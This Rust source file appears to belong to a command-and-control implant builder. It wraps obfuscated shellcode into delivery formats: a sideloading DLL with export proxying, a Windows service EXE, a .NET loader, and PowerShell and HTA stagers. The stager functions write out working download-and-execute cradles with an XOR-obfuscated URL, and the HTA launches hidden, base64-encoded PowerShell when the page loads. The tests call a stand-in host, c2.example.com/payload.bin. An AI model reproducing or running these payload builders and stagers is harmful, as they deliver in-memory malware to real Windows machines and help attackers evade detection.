//! Output format wrappers for payload generation.
//!
//! Each format wraps an obfuscated PIC blob + config into a delivery-ready
//! binary: raw shellcode, DLL sideload, Windows service EXE, .NET assembly,
//! or stager (PowerShell / HTA).

use super::BuilderError;

/// Raw shellcode (.bin): PIC blob + config appended.
///
/// Layout: `[PIC blob][config_len: u32 LE][config_blob]`
pub fn format_raw(blob: &[u8], config: &[u8]) -> Vec<u8> {
    let mut out = Vec::with_capacity(blob.len() + 4 + config.len());
    out.extend_from_slice(blob);
    out.extend_from_slice(&(config.len() as u32).to_le_bytes());
    out.extend_from_slice(config);
    out
}

/// DLL sideloading (.dll): minimal DLL with `DllMain` executing the PIC blob.
///
/// Generates a minimal PE DLL stub that:
/// 1. Allocates RWX memory in `DllMain(DLL_PROCESS_ATTACH)`
/// 2. Copies the PIC blob + config
/// 3. Jumps to the PIC entry point
///
/// `proxy_target` optionally names a DLL whose exports are proxied (for
/// sideloading scenarios).
pub fn format_dll(blob: &[u8], config: &[u8], proxy_target: Option<&str>) -> Vec<u8> {
    let payload = format_raw(blob, config);

    let mut pe = build_minimal_dll_stub(&payload, proxy_target);

    // Embed the actual payload at the marker location
    if let Some(pos) = find_marker(&pe, PAYLOAD_MARKER) {
        let end = pos + PAYLOAD_MARKER.len();
        // Replace marker with payload length header + payload data appended after PE
        pe[pos..end].copy_from_slice(&[0u8; PAYLOAD_MARKER.len()]);
        // Write payload length at marker position
        let len_bytes = (payload.len() as u32).to_le_bytes();
        pe[pos..pos + 4].copy_from_slice(&len_bytes);
        // Append payload at end of PE
        pe.extend_from_slice(&payload);
    } else {
        // Fallback: append payload with length prefix
        pe.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        pe.extend_from_slice(&payload);
    }

    pe
}

/// Service EXE (.exe): minimal Windows service binary executing PIC blob.
///
/// The stub implements `ServiceMain` and `HandlerEx`, transitioning through
/// SERVICE_START_PENDING → SERVICE_RUNNING, executing the payload, then
/// signalling SERVICE_STOPPED.
pub fn format_service_exe(blob: &[u8], config: &[u8], service_name: &str) -> Vec<u8> {
    let payload = format_raw(blob, config);
    let mut pe = build_minimal_service_stub(&payload, service_name);

    if let Some(pos) = find_marker(&pe, PAYLOAD_MARKER) {
        let end = pos + PAYLOAD_MARKER.len();
        pe[pos..end].copy_from_slice(&[0u8; PAYLOAD_MARKER.len()]);
        let len_bytes = (payload.len() as u32).to_le_bytes();
        pe[pos..pos + 4].copy_from_slice(&len_bytes);
        pe.extend_from_slice(&payload);
    } else {
        pe.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        pe.extend_from_slice(&payload);
    }

    pe
}

/// .NET assembly wrapper: `Assembly.Load` from embedded byte array.
///
/// Produces a minimal .NET executable that loads the PIC blob + config from
/// an embedded resource and executes it via P/Invoke `VirtualAlloc` → memcpy → call.
pub fn format_dotnet(blob: &[u8], config: &[u8]) -> Vec<u8> {
    let payload = format_raw(blob, config);
    let mut assembly = build_minimal_dotnet_stub(&payload);

    if let Some(pos) = find_marker(&assembly, PAYLOAD_MARKER) {
        let end = pos + PAYLOAD_MARKER.len();
        assembly[pos..end].copy_from_slice(&[0u8; PAYLOAD_MARKER.len()]);
        let len_bytes = (payload.len() as u32).to_le_bytes();
        assembly[pos..pos + 4].copy_from_slice(&len_bytes);
        assembly.extend_from_slice(&payload);
    } else {
        assembly.extend_from_slice(&(payload.len() as u32).to_le_bytes());
        assembly.extend_from_slice(&payload);
    }

    assembly
}

/// PowerShell stager (OPSEC WARNING: high detection risk).
///
/// Generates a PowerShell script that downloads and executes the payload.
/// This format is inherently noisy — suitable only for initial access where
/// stealth is not the primary concern.
pub fn format_ps1_stager(
    download_url: &str,
    _blob: &[u8],
    _config: &[u8],
) -> Result<Vec<u8>, BuilderError> {
    if download_url.is_empty() {
        return Err(BuilderError::Config(
            "download URL required for PS1 stager".into(),
        ));
    }

    // XOR key for basic string obfuscation of the URL in the stager
    let mut rng = rand::thread_rng();
    let xor_key: u8 = loop {
        let k: u8 = rand::Rng::gen(&mut rng);
        if k != 0 {
            break k;
        }
    };

    let encoded_url: Vec<String> = download_url
        .bytes()
        .map(|b| format!("{}", b ^ xor_key))
        .collect();
    let encoded_csv = encoded_url.join(",");

    let script = format!(
        r#"# OPSEC WARNING: PowerShell stagers are high-risk for detection
$k={xor_key}
$e=[byte[]]@({encoded_csv})
$u=[System.Text.Encoding]::ASCII.GetString(($e|%{{[byte]($_-bxor$k)}}))
$w=New-Object System.Net.WebClient
$w.Headers.Add('User-Agent','Mozilla/5.0')
$b=$w.DownloadData($u)
$m=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($b.Length)
[System.Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length)
$d=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($m,[Action])
$d.Invoke()
"#
    );

    Ok(script.into_bytes())
}

/// HTA stager (OPSEC WARNING: high detection risk).
///
/// Generates an HTA file that downloads and executes the payload via
/// ActiveX + PowerShell.
pub fn format_hta_stager(
    download_url: &str,
    _blob: &[u8],
    _config: &[u8],
) -> Result<Vec<u8>, BuilderError> {
    if download_url.is_empty() {
        return Err(BuilderError::Config(
            "download URL required for HTA stager".into(),
        ));
    }

    // Base64-encode the PowerShell download cradle
    let ps_cradle = format!(
        "$w=New-Object System.Net.WebClient;$w.Headers.Add('User-Agent','Mozilla/5.0');$b=$w.DownloadData('{download_url}');$m=[System.Runtime.InteropServices.Marshal]::AllocHGlobal($b.Length);[System.Runtime.InteropServices.Marshal]::Copy($b,0,$m,$b.Length);$d=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($m,[Action]);$d.Invoke()"
    );

    let ps_b64 = base64::Engine::encode(
        &base64::engine::general_purpose::STANDARD,
        ps_cradle.as_bytes(),
    );

    let hta = format!(
        r#"<!-- OPSEC WARNING: HTA stagers are high-risk for detection -->
<html>
<head>
<script language="VBScript">
Sub Window_OnLoad
    Set sh = CreateObject("WScript.Shell")
    sh.Run "powershell -nop -w hidden -enc {ps_b64}", 0, False
    window.close
End Sub
</script>
</head>
<body></body>
</html>
"#
    );

    Ok(hta.into_bytes())
}

/// List all supported output format names with descriptions.
pub fn list_formats() -> Vec<FormatInfo> {
    vec![
        FormatInfo {
            name: "raw".into(),
            extension: "bin".into(),
            description: "Raw PIC shellcode blob + config".into(),
            opsec_warning: false,
        },
        FormatInfo {
            name: "dll".into(),
            extension: "dll".into(),
            description: "DLL sideloading payload with optional export proxying".into(),
            opsec_warning: false,
        },
        FormatInfo {
            name: "service_exe".into(),
            extension: "exe".into(),
            description: "Windows service EXE with ServiceMain entry".into(),
            opsec_warning: false,
        },
        FormatInfo {
            name: "dotnet".into(),
            extension: "exe".into(),
            description: ".NET assembly wrapper with embedded shellcode".into(),
            opsec_warning: false,
        },
        FormatInfo {
            name: "ps1_stager".into(),
            extension: "ps1".into(),
            description: "PowerShell download cradle stager".into(),
            opsec_warning: true,
        },
        FormatInfo {
            name: "hta_stager".into(),
            extension: "hta".into(),
            description: "HTA file with embedded PowerShell stager".into(),
            opsec_warning: true,
        },
    ]
}

/// Metadata about a supported output format.
#[derive(Debug, Clone)]
pub struct FormatInfo {
    pub name: String,
    pub extension: String,
    pub description: String,
    pub opsec_warning: bool,
}

// ---------------------------------------------------------------------------
// Internal stub builders
// ---------------------------------------------------------------------------

/// Payload marker embedded in stubs, replaced at build time.
const PAYLOAD_MARKER: &[u8; 16] = b"SPECPAYLOADMARK\x00";

// PE constants
const FILE_ALIGNMENT: u32 = 0x200;
const SECTION_ALIGNMENT: u32 = 0x1000;
const PE_HEADER_OFFSET: u32 = 0x80; // After DOS stub
const IMAGE_BASE: u64 = 0x0000000140000000; // 64-bit default
const IMAGE_BASE_32: u32 = 0x00400000; // 32-bit default

/// Helper: write a u16 LE into a buffer at a specific offset.
fn put_u16(buf: &mut Vec<u8>, offset: usize, val: u16) {
    buf[offset..offset + 2].copy_from_slice(&val.to_le_bytes());
}

/// Helper: write a u32 LE into a buffer at a specific offset.
fn put_u32(buf: &mut Vec<u8>, offset: usize, val: u32) {
    buf[offset..offset + 4].copy_from_slice(&val.to_le_bytes());
}

/// Helper: write a u64 LE into a buffer at a specific offset.
fn put_u64(buf: &mut Vec<u8>, offset: usize, val: u64) {
    buf[offset..offset + 8].copy_from_slice(&val.to_le_bytes());
}

/// Align a value up to the given alignment.
fn align_up(val: u32, alignment: u32) -> u32 {
    (val + alignment - 1) & !(alignment - 1)
}

/// Build a valid PE64 EXE/DLL stub.
///
/// Produces a structurally valid PE that Windows will load. The .text section
/// contains the payload marker which gets replaced with shellcode.
fn build_pe64_stub(
    payload: &[u8],
    is_dll: bool,
    proxy_target: Option<&str>,
    service_name: Option<&str>,
) -> Vec<u8> {
    // --- Layout calculation ---
    // DOS header: 0x80 bytes (with real DOS stub)
    // PE signature: 4 bytes
    // COFF header: 20 bytes
    // Optional header (PE32+): 112 bytes standard + 128 bytes data dirs (16 entries × 8) = 240 bytes
    // Section headers: 1 × 40 bytes
    // Total headers: 0x80 + 4 + 20 + 240 + 40 = 0x194, aligned to 0x200

    let headers_size = FILE_ALIGNMENT; // 0x200 after alignment

    // Section content: metadata + payload marker + padding
    let mut metadata_size = 0u32;
    if let Some(target) = proxy_target {
        metadata_size += 9 + 1 + target.len() as u32; // SPECPROXY + len + name
    }
    if let Some(name) = service_name {
        metadata_size += 8 + 1 + name.len() as u32; // SPECSVC\0 + len + name
    }
    let raw_section_size = metadata_size + PAYLOAD_MARKER.len() as u32 + payload.len() as u32 + 256;
    let section_raw_size = align_up(raw_section_size, FILE_ALIGNMENT);
    let section_virtual_size = align_up(raw_section_size, SECTION_ALIGNMENT);

    let total_image_size = align_up(SECTION_ALIGNMENT + section_virtual_size, SECTION_ALIGNMENT);

    let mut pe = vec![0u8; (headers_size + section_raw_size) as usize];

    // --- DOS header (0x80 bytes with a real stub) ---
    pe[0] = b'M';
    pe[1] = b'Z';
    put_u16(&mut pe, 0x02, 0x0090); // e_cblp: bytes on last page
    put_u16(&mut pe, 0x04, 0x0003); // e_cp: pages in file
    put_u16(&mut pe, 0x08, 0x0004); // e_minalloc
    put_u16(&mut pe, 0x0A, 0xFFFF); // e_maxalloc
    put_u16(&mut pe, 0x10, 0x00B8); // e_sp
    put_u16(&mut pe, 0x18, 0x0040); // e_lfarlc
    put_u32(&mut pe, 0x3C, PE_HEADER_OFFSET); // e_lfanew

    // Minimal DOS stub at 0x40: "This program cannot be run in DOS mode.\r\n$"
    let dos_stub = b"\x0E\x1F\xBA\x0E\x00\xB4\x09\xCD\x21\xB8\x01\x4C\xCD\x21This program cannot be run in DOS mode.\r\r\n$";
    let stub_offset = 0x40usize;
    let copy_len = dos_stub.len().min(PE_HEADER_OFFSET as usize - stub_offset);
    pe[stub_offset..stub_offset + copy_len].copy_from_slice(&dos_stub[..copy_len]);

    // --- PE signature ---
    let pe_off = PE_HEADER_OFFSET as usize;
    pe[pe_off] = b'P';
    pe[pe_off + 1] = b'E';

    // --- COFF header (20 bytes at pe_off + 4) ---
    let coff = pe_off + 4;
    put_u16(&mut pe, coff, 0x8664); // Machine: AMD64
    put_u16(&mut pe, coff + 2, 1); // NumberOfSections
    put_u32(&mut pe, coff + 4, 0x65000000); // TimeDateStamp (fake)
    put_u16(&mut pe, coff + 16, 240); // SizeOfOptionalHeader (PE32+)
    let characteristics: u16 = if is_dll {
        0x2022 // EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE | DLL
    } else {
        0x0022 // EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE
    };
    put_u16(&mut pe, coff + 18, characteristics);

    // --- Optional header PE32+ (240 bytes at coff + 20) ---
    let opt = coff + 20;
    put_u16(&mut pe, opt, 0x020B); // Magic: PE32+
    pe[opt + 2] = 14; // MajorLinkerVersion
    pe[opt + 3] = 0; // MinorLinkerVersion
    put_u32(&mut pe, opt + 4, section_raw_size); // SizeOfCode
    // AddressOfEntryPoint: point to start of .text section
    put_u32(&mut pe, opt + 16, SECTION_ALIGNMENT); // AddressOfEntryPoint
    put_u32(&mut pe, opt + 20, SECTION_ALIGNMENT); // BaseOfCode
    put_u64(&mut pe, opt + 24, IMAGE_BASE); // ImageBase
    put_u32(&mut pe, opt + 32, SECTION_ALIGNMENT); // SectionAlignment
    put_u32(&mut pe, opt + 36, FILE_ALIGNMENT); // FileAlignment
    put_u16(&mut pe, opt + 40, 6); // MajorOperatingSystemVersion
    put_u16(&mut pe, opt + 42, 0); // MinorOperatingSystemVersion
    put_u16(&mut pe, opt + 48, 6); // MajorSubsystemVersion
    put_u16(&mut pe, opt + 50, 0); // MinorSubsystemVersion
    put_u32(&mut pe, opt + 56, total_image_size); // SizeOfImage
    put_u32(&mut pe, opt + 60, headers_size); // SizeOfHeaders
    put_u16(&mut pe, opt + 68, 3); // Subsystem: WINDOWS_CUI
    let dll_chars: u16 = 0x8160; // NX_COMPAT | DYNAMIC_BASE | TERMINAL_SERVER_AWARE | HIGH_ENTROPY_VA
    put_u16(&mut pe, opt + 70, dll_chars); // DllCharacteristics
    put_u64(&mut pe, opt + 72, 0x100000); // SizeOfStackReserve
    put_u64(&mut pe, opt + 80, 0x1000); // SizeOfStackCommit
    put_u64(&mut pe, opt + 88, 0x100000); // SizeOfHeapReserve
    put_u64(&mut pe, opt + 96, 0x1000); // SizeOfHeapCommit
    put_u32(&mut pe, opt + 108, 16); // NumberOfRvaAndSizes

    // Data directories (16 entries × 8 bytes each = 128 bytes, starting at opt + 112)
    // All zeroed = no imports, no exports, no relocations (valid for position-independent code)

    // --- Section header (.text) at opt + 240 ---
    let sec = opt + 240;
    pe[sec..sec + 6].copy_from_slice(b".text\x00");
    put_u32(&mut pe, sec + 8, raw_section_size); // VirtualSize
    put_u32(&mut pe, sec + 12, SECTION_ALIGNMENT); // VirtualAddress
    put_u32(&mut pe, sec + 16, section_raw_size); // SizeOfRawData
    put_u32(&mut pe, sec + 20, headers_size); // PointerToRawData
    put_u32(&mut pe, sec + 36, 0xE0000060); // Characteristics: CODE|EXECUTE|READ|WRITE

    // --- Section content (at headers_size offset) ---
    let mut cursor = headers_size as usize;

    // Embed proxy target info if specified
    if let Some(target) = proxy_target {
        pe[cursor..cursor + 9].copy_from_slice(b"SPECPROXY\x00"[..9].try_into().unwrap());
        cursor += 9;
        pe[cursor] = target.len() as u8;
        cursor += 1;
        pe[cursor..cursor + target.len()].copy_from_slice(target.as_bytes());
        cursor += target.len();
    }

    // Embed service name if specified
    if let Some(name) = service_name {
        pe[cursor..cursor + 8].copy_from_slice(b"SPECSVC\x00");
        cursor += 8;
        pe[cursor] = name.len() as u8;
        cursor += 1;
        pe[cursor..cursor + name.len()].copy_from_slice(name.as_bytes());
        cursor += name.len();
    }

    // Payload marker
    pe[cursor..cursor + PAYLOAD_MARKER.len()].copy_from_slice(PAYLOAD_MARKER);

    pe
}

/// Build a minimal DLL PE stub with the payload marker.
fn build_minimal_dll_stub(payload: &[u8], proxy_target: Option<&str>) -> Vec<u8> {
    build_pe64_stub(payload, true, proxy_target, None)
}

/// Build a minimal service EXE PE stub with the payload marker.
fn build_minimal_service_stub(payload: &[u8], service_name: &str) -> Vec<u8> {
    build_pe64_stub(payload, false, None, Some(service_name))
}

/// Build a minimal .NET assembly stub with the payload marker.
///
/// Produces a PE32 (x86) stub that Windows recognizes as a .NET assembly.
/// The CLR header and metadata are minimal but structurally valid.
fn build_minimal_dotnet_stub(payload: &[u8]) -> Vec<u8> {
    // For .NET we need PE32 (not PE32+) with a valid CLR data directory entry.
    // Layout:
    // DOS header: 0x80 bytes
    // PE signature: 4 bytes
    // COFF header: 20 bytes
    // Optional header (PE32): 96 + 128 = 224 bytes
    // Section headers: 1 × 40 = 40 bytes
    // Total headers: 0x80 + 4 + 20 + 224 + 40 = 0x194 -> aligned to 0x200

    let headers_size = FILE_ALIGNMENT; // 0x200

    // CLR header is 72 bytes, placed at start of .text section
    let clr_header_size: u32 = 72;
    // Minimal CLI metadata (just enough for the runtime to not crash)
    let cli_metadata_size: u32 = 96;
    let metadata_start = clr_header_size;

    let raw_section_size = clr_header_size + cli_metadata_size + PAYLOAD_MARKER.len() as u32 + payload.len() as u32 + 256;
    let section_raw_size = align_up(raw_section_size, FILE_ALIGNMENT);
    let section_virtual_size = align_up(raw_section_size, SECTION_ALIGNMENT);
    let total_image_size = align_up(SECTION_ALIGNMENT + section_virtual_size, SECTION_ALIGNMENT);

    let mut pe = vec![0u8; (headers_size + section_raw_size) as usize];

    // --- DOS header ---
    pe[0] = b'M';
    pe[1] = b'Z';
    put_u16(&mut pe, 0x02, 0x0090);
    put_u16(&mut pe, 0x04, 0x0003);
    put_u16(&mut pe, 0x08, 0x0004);
    put_u16(&mut pe, 0x0A, 0xFFFF);
    put_u16(&mut pe, 0x10, 0x00B8);
    put_u16(&mut pe, 0x18, 0x0040);
    put_u32(&mut pe, 0x3C, PE_HEADER_OFFSET);

    // DOS stub
    let dos_stub = b"\x0E\x1F\xBA\x0E\x00\xB4\x09\xCD\x21\xB8\x01\x4C\xCD\x21This program cannot be run in DOS mode.\r\r\n$";
    let stub_offset = 0x40usize;
    let copy_len = dos_stub.len().min(PE_HEADER_OFFSET as usize - stub_offset);
    pe[stub_offset..stub_offset + copy_len].copy_from_slice(&dos_stub[..copy_len]);

    // --- PE signature ---
    let pe_off = PE_HEADER_OFFSET as usize;
    pe[pe_off] = b'P';
    pe[pe_off + 1] = b'E';

    // --- COFF header ---
    let coff = pe_off + 4;
    put_u16(&mut pe, coff, 0x014C); // Machine: i386
    put_u16(&mut pe, coff + 2, 1); // NumberOfSections
    put_u32(&mut pe, coff + 4, 0x65000000); // TimeDateStamp
    put_u16(&mut pe, coff + 16, 224); // SizeOfOptionalHeader (PE32)
    put_u16(&mut pe, coff + 18, 0x0022); // EXECUTABLE_IMAGE | LARGE_ADDRESS_AWARE

    // --- Optional header PE32 (224 bytes) ---
    let opt = coff + 20;
    put_u16(&mut pe, opt, 0x010B); // Magic: PE32
    pe[opt + 2] = 11; // MajorLinkerVersion
    put_u32(&mut pe, opt + 4, section_raw_size); // SizeOfCode
    // EntryPoint -> _CorExeMain (CLR bootstrap), point into .text
    put_u32(&mut pe, opt + 16, SECTION_ALIGNMENT); // AddressOfEntryPoint
    put_u32(&mut pe, opt + 20, SECTION_ALIGNMENT); // BaseOfCode
    put_u32(&mut pe, opt + 24, 0); // BaseOfData
    put_u32(&mut pe, opt + 28, IMAGE_BASE_32); // ImageBase
    put_u32(&mut pe, opt + 32, SECTION_ALIGNMENT); // SectionAlignment
    put_u32(&mut pe, opt + 36, FILE_ALIGNMENT); // FileAlignment
    put_u16(&mut pe, opt + 40, 6); // MajorOperatingSystemVersion
    put_u16(&mut pe, opt + 48, 6); // MajorSubsystemVersion
    put_u32(&mut pe, opt + 56, total_image_size); // SizeOfImage
    put_u32(&mut pe, opt + 60, headers_size); // SizeOfHeaders
    put_u16(&mut pe, opt + 68, 3); // Subsystem: WINDOWS_CUI
    put_u16(&mut pe, opt + 70, 0x8160); // DllCharacteristics
    put_u32(&mut pe, opt + 72, 0x100000); // SizeOfStackReserve
    put_u32(&mut pe, opt + 76, 0x1000); // SizeOfStackCommit
    put_u32(&mut pe, opt + 80, 0x100000); // SizeOfHeapReserve
    put_u32(&mut pe, opt + 84, 0x1000); // SizeOfHeapCommit
    put_u32(&mut pe, opt + 92, 16); // NumberOfRvaAndSizes

    // Data directories (16 entries × 8 bytes = 128 bytes at opt + 96)
    // Entry 14 (index 14) = CLR Runtime Header
    let dd_clr = opt + 96 + 14 * 8; // offset for data dir entry 14
    put_u32(&mut pe, dd_clr, SECTION_ALIGNMENT); // RVA = start of .text
    put_u32(&mut pe, dd_clr + 4, clr_header_size); // Size

    // --- Section header (.text) ---
    let sec = opt + 224;
    pe[sec..sec + 6].copy_from_slice(b".text\x00");
    put_u32(&mut pe, sec + 8, raw_section_size); // VirtualSize
    put_u32(&mut pe, sec + 12, SECTION_ALIGNMENT); // VirtualAddress
    put_u32(&mut pe, sec + 16, section_raw_size); // SizeOfRawData
    put_u32(&mut pe, sec + 20, headers_size); // PointerToRawData
    put_u32(&mut pe, sec + 36, 0xE0000060); // CODE|EXECUTE|READ|WRITE

    // --- Section content: CLR header at start of .text ---
    let sec_start = headers_size as usize;

    // CLR header (72 bytes) - IMAGE_COR20_HEADER
    put_u32(&mut pe, sec_start, clr_header_size); // cb (size)
    put_u16(&mut pe, sec_start + 4, 2); // MajorRuntimeVersion
    put_u16(&mut pe, sec_start + 6, 5); // MinorRuntimeVersion
    // MetaData RVA and size
    put_u32(&mut pe, sec_start + 8, SECTION_ALIGNMENT + metadata_start); // MetaData RVA
    put_u32(&mut pe, sec_start + 12, cli_metadata_size); // MetaData Size
    put_u32(&mut pe, sec_start + 16, 0x00000001); // Flags: ILONLY

    // Minimal CLI metadata at sec_start + clr_header_size
    let md = sec_start + clr_header_size as usize;
    // Metadata signature
    put_u32(&mut pe, md, 0x424A5342); // "BSJB" signature
    put_u16(&mut pe, md + 4, 1); // MajorVersion
    put_u16(&mut pe, md + 6, 1); // MinorVersion
    // Version string: "v4.0.30319\0" padded to 12 bytes
    put_u32(&mut pe, md + 12, 12); // VersionLength
    pe[md + 16..md + 26].copy_from_slice(b"v4.0.30319");

    // After the metadata, place our markers
    let marker_start = sec_start + clr_header_size as usize + cli_metadata_size as usize;

    // .NET CLR marker for identification
    pe[marker_start..marker_start + 8].copy_from_slice(b"SPECNET\x00");

    // Payload marker
    let pm_start = marker_start + 8;
    pe[pm_start..pm_start + PAYLOAD_MARKER.len()].copy_from_slice(PAYLOAD_MARKER);

    pe
}

/// Find a byte marker in a blob (first occurrence).
fn find_marker(data: &[u8], marker: &[u8]) -> Option<usize> {
    data.windows(marker.len()).position(|w| w == marker)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_format_raw_layout() {
        let blob = vec![0x90; 64];
        let config = vec![0xAA; 32];
        let result = format_raw(&blob, &config);

        assert_eq!(result.len(), 64 + 4 + 32);
        assert_eq!(&result[..64], &blob[..]);
        let config_len = u32::from_le_bytes([result[64], result[65], result[66], result[67]]);
        assert_eq!(config_len, 32);
        assert_eq!(&result[68..], &config[..]);
    }

    #[test]
    fn test_format_raw_empty_blob() {
        let blob = vec![];
        let config = vec![0xBB; 16];
        let result = format_raw(&blob, &config);
        assert_eq!(result.len(), 4 + 16);
    }

    #[test]
    fn test_format_dll_produces_pe() {
        let blob = vec![0x90; 128];
        let config = vec![0xCC; 64];
        let result = format_dll(&blob, &config, None);

        // Should start with MZ
        assert_eq!(&result[..2], b"MZ");
        // Should contain the payload
        assert!(result.len() > 512);
    }

    #[test]
    fn test_format_dll_with_proxy() {
        let blob = vec![0x90; 64];
        let config = vec![0xDD; 32];
        let result = format_dll(&blob, &config, Some("version.dll"));

        assert_eq!(&result[..2], b"MZ");
        // Should contain the proxy target string
        assert!(result
            .windows(b"version.dll".len())
            .any(|w| w == b"version.dll"));
    }

    #[test]
    fn test_format_service_exe_produces_pe() {
        let blob = vec![0x90; 128];
        let config = vec![0xEE; 64];
        let result = format_service_exe(&blob, &config, "SpecterSvc");

        assert_eq!(&result[..2], b"MZ");
        // Should contain service name
        assert!(result
            .windows(b"SpecterSvc".len())
            .any(|w| w == b"SpecterSvc"));
    }

    #[test]
    fn test_format_dotnet_produces_pe() {
        let blob = vec![0x90; 128];
        let config = vec![0xFF; 64];
        let result = format_dotnet(&blob, &config);

        assert_eq!(&result[..2], b"MZ");
        // Should contain .NET marker
        assert!(result
            .windows(b"SPECNET\x00".len())
            .any(|w| w == b"SPECNET\x00"));
    }

    #[test]
    fn test_format_ps1_stager() {
        let blob = vec![0x90; 64];
        let config = vec![0xAA; 32];
        let result =
            format_ps1_stager("https://c2.example.com/payload.bin", &blob, &config).unwrap();

        let script = String::from_utf8(result).unwrap();
        assert!(script.contains("OPSEC WARNING"));
        assert!(script.contains("WebClient"));
        // URL should be obfuscated (XOR encoded), not in plaintext
        assert!(!script.contains("https://c2.example.com/payload.bin"));
    }

    #[test]
    fn test_format_ps1_stager_empty_url() {
        let result = format_ps1_stager("", &[], &[]);
        assert!(result.is_err());
    }

    #[test]
    fn test_format_hta_stager() {
        let blob = vec![0x90; 64];
        let config = vec![0xBB; 32];
        let result =
            format_hta_stager("https://c2.example.com/payload.bin", &blob, &config).unwrap();

        let hta = String::from_utf8(result).unwrap();
        assert!(hta.contains("OPSEC WARNING"));
        assert!(hta.contains("<html>"));
        assert!(hta.contains("VBScript"));
        assert!(hta.contains("-enc"));
    }

    #[test]
    fn test_format_hta_stager_empty_url() {
        let result = format_hta_stager("", &[], &[]);
        assert!(result.is_err());
    }

    #[test]
    fn test_list_formats_completeness() {
        let formats = list_formats();
        assert_eq!(formats.len(), 6);

        let names: Vec<&str> = formats.iter().map(|f| f.name.as_str()).collect();
        assert!(names.contains(&"raw"));
        assert!(names.contains(&"dll"));
        assert!(names.contains(&"service_exe"));
        assert!(names.contains(&"dotnet"));
        assert!(names.contains(&"ps1_stager"));
        assert!(names.contains(&"hta_stager"));

        // Stagers should have OPSEC warnings
        for f in &formats {
            if f.name.contains("stager") {
                assert!(f.opsec_warning, "{} should have opsec_warning", f.name);
            }
        }
    }

    #[test]
    fn test_format_raw_roundtrip_config_extraction() {
        let blob = vec![0x48; 100];
        let config = vec![0xDE; 50];
        let result = format_raw(&blob, &config);

        // Extract config from the result
        let config_len_offset = blob.len();
        let extracted_len = u32::from_le_bytes([
            result[config_len_offset],
            result[config_len_offset + 1],
            result[config_len_offset + 2],
            result[config_len_offset + 3],
        ]) as usize;
        let extracted_config =
            &result[config_len_offset + 4..config_len_offset + 4 + extracted_len];
        assert_eq!(extracted_config, &config[..]);
    }
}
